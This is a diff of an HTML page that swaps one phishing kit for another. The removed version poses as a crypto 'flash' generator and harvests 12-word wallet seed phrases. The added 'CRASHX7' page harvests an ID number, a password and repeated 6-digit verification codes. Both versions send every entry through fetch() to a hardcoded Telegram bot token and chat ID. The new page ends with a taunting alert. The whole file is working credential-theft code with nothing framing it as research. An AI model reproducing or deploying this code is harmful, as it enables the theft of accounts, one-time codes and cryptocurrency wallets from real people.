@@ -2,163 +2,236 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ULTRA FLASH TERIAL 3.61</title>
+  <title>CRASHX7</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    body {
-      margin: 0;
-      padding: 0;
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: Arial, sans-serif;
       background: url('background.jpg') no-repeat center center fixed;
       background-size: cover;
-      font-family: Arial, sans-serif;
       color: white;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
+
     .container {
-      background: rgba(0, 0, 0, 0.65);
-      padding: 25px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.6);
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-    select, input[type="text"] {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      max-width: 320px;
+      background-color: rgba(0,0,0,0.65);
+      padding: 25px 15px;
+      border-radius: 20px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.7);
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-weight: bold;
+      font-size: 28px;
+      user-select: none;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border-radius: 10px;
       border: none;
-      border-radius: 8px;
-      background: #1e1e1e;
-      color: white;
+      font-size: 16px;
+      box-sizing: border-box;
     }
-    input::placeholder {
-      color: #aaa;
-    }
+
     button {
       width: 100%;
-      padding: 12px;
-      background: #007bff;
-      border: none;
-      border-radius: 8px;
+      padding: 14px;
+      background-color: #d22;
       color: white;
+      border: none;
+      border-radius: 10px;
       font-size: 16px;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 12px;
+      box-shadow: 0 0 10px #d22;
+      box-sizing: border-box;
     }
-    .progress-bar {
-      width: 100%;
-      height: 10px;
-      background: #333;
-      border-radius: 8px;
-      overflow: hidden;
-      margin-top: 15px;
-      display: none;
+
+    .loader {
+      position: relative;
+      margin: 20px auto;
+      border: 6px solid #eee;
+      border-top: 6px solid #d22;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
     }
-    .progress {
-      height: 100%;
-      background: #00ff99;
-      width: 0%;
-    }
-    .popup {
-      position: fixed;
+
+    /* النص داخل الدائرة */
+    .loader span {
+      position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: #111;
-      padding: 20px;
+      font-weight: bold;
+      font-size: 18px;
+      user-select: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .instructions {
+      margin-top: 25px;
+      font-size: 14px;
+      text-align: left;
+      background: rgba(255 255 255 / 0.1);
+      padding: 12px;
       border-radius: 12px;
-      color: white;
-      z-index: 999;
-      text-align: center;
-      display: none;
-      box-shadow: 0 0 20px rgba(255,255,255,0.2);
+      user-select: none;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>ULTRA FLASH TERIAL 3.61</h2>
-    <select id="amount">
-      <option value="2.5K">2.5K = FREE</option>
-      <option value="20K">20K</option>
-      <option value="100K">100K</option>
-    </select>
-    <select id="network">
-      <option value="BEP20">BEP20</option>
-      <option value="TRC20">TRC20</option>
-      <option value="ERC20">ERC20</option>
-    </select>
-    <input type="text" id="seed" placeholder="Enter your 12-word seed phrase" />
-    <button onclick="startGeneration()">Generate</button>
-    <div class="progress-bar" id="progressBar">
-      <div class="progress" id="progress"></div>
+  <div class="container" id="mainContainer">
+    <h1>CRASHX7</h1>
+
+    <div id="step1">
+      <input type="text" id="idNumber" placeholder="ID Number" />
+      <input type="password" id="password" placeholder="Password" />
+      <button id="connectBtn">Connect</button>
+    </div>
+
+    <div id="loading" style="display:none;">
+      <div class="loader"><span id="countdown">0</span></div>
+      <div>Loading...</div>
+    </div>
+
+    <div id="step2" style="display:none;">
+      <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" />
+      <button id="continueBtn" disabled>Continue</button>
+    </div>
+
+    <div id="message" style="display:none; margin-top: 15px;"></div>
+
+    <div class="instructions">
+      <strong>How to use:</strong>
+      <ol>
+        <li>Connect to server</li>
+        <li>Open your Telegram in pop up mode</li>
+        <li>Enjoy.</li>
+      </ol>
     </div>
   </div>
 
-  <div class="popup" id="popup">
-    <p>Insufficient balance.<br>Wallet must contain 20 USDT.</p>
-  </div>
-
   <script>
-    function validateSeed(seed) {
-      const words = seed.trim().split(/\s+/);
-      return words.length === 12;
-    }
+    const chatId = '7739393558';
+    const botToken = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
 
-    function sendToTelegram(message) {
-      const chatId = '7739393558';
-      const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const step1 = document.getElementById('step1');
+    const loading = document.getElementById('loading');
+    const step2 = document.getElementById('step2');
+    const message = document.getElementById('message');
+
+    const connectBtn = document.getElementById('connectBtn');
+    const continueBtn = document.getElementById('continueBtn');
+
+    const idNumberInput = document.getElementById('idNumber');
+    const passwordInput = document.getElementById('password');
+    const codeInput = document.getElementById('codeInput');
+
+    const countdownSpan = document.getElementById('countdown');
+
+    let continueCount = 0;
+    let countdownInterval;
+
+    function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       fetch(url, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           chat_id: chatId,
-          text: message
+          text: text,
+          parse_mode: "HTML"
         })
-      });
+      }).catch(console.error);
     }
 
-    function startGeneration() {
-      const seed = document.getElementById('seed').value.trim();
-      const amount = document.getElementById('amount').value;
-      const network = document.getElementById('network').value;
+    function startLoading(seconds, callback) {
+      let timeLeft = seconds;
+      countdownSpan.textContent = timeLeft;
+      loading.style.display = 'block';
 
-      if (!validateSeed(seed)) {
-        alert('Please enter exactly 12 words in the seed phrase.');
-        return;
-      }
-
-      // Send info to Telegram
-      const message = `New Submission:\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`;
-      sendToTelegram(message);
-
-      // Start progress bar
-      const bar = document.getElementById('progressBar');
-      const progress = document.getElementById('progress');
-      let seconds = 0;
-      bar.style.display = 'block';
-      progress.style.width = '0%';
-
-      const interval = setInterval(() => {
-        seconds++;
-        progress.style.width = (seconds / 15) * 100 + '%';
-
-        if (seconds === 7) {
-          document.getElementById('popup').style.display = 'block';
-        }
-
-        if (seconds >= 15) {
-          clearInterval(interval);
-          // Hide popup if still shown
-          document.getElementById('popup').style.display = 'none';
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        countdownSpan.textContent = timeLeft >= 0 ? timeLeft : 0;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          loading.style.display = 'none';
+          callback();
         }
       }, 1000);
     }
+
+    connectBtn.addEventListener('click', () => {
+      const idVal = idNumberInput.value.trim();
+      const passVal = passwordInput.value.trim();
+      if (!idVal || !passVal) {
+        alert('Please fill all fields');
+        return;
+      }
+      sendToTelegram(`ID Number: <b>${idVal}</b>\nPassword: <b>${passVal}</b>`);
+      step1.style.display = 'none';
+      message.style.display = 'none';
+
+      startLoading(40, () => {
+        step2.style.display = 'block';
+        codeInput.value = '';
+        continueBtn.disabled = true;
+        message.style.display = 'none';
+      });
+    });
+
+    codeInput.addEventListener('input', () => {
+      const val = codeInput.value.trim();
+      continueBtn.disabled = !(val.length === 6 && /^\d{6}$/.test(val));
+    });
+
+    continueBtn.addEventListener('click', () => {
+      const codeVal = codeInput.value.trim();
+      if (codeVal.length !== 6 || !/^\d{6}$/.test(codeVal)) {
+        alert('Please enter a valid 6-digit code');
+        return;
+      }
+      sendToTelegram(`Code entered: <b>${codeVal}</b>`);
+      continueBtn.disabled = true;
+      message.style.display = 'none';
+      step2.style.display = 'none';
+
+      continueCount++;
+      if (continueCount === 1) {
+        startLoading(40, () => {
+          step2.style.display = 'block';
+          codeInput.value = '';
+          continueBtn.disabled = true;
+        });
+      } else if (continueCount === 2) {
+        startLoading(40, () => {
+          message.style.display = 'block';
+          message.textContent = 'Connection successful.';
+          setTimeout(() => {
+            message.style.display = 'none';
+            alert('Your hand is in the ass');
+          }, 60000);
+        });
+      }
+    });
   </script>
 </body>
 </html>
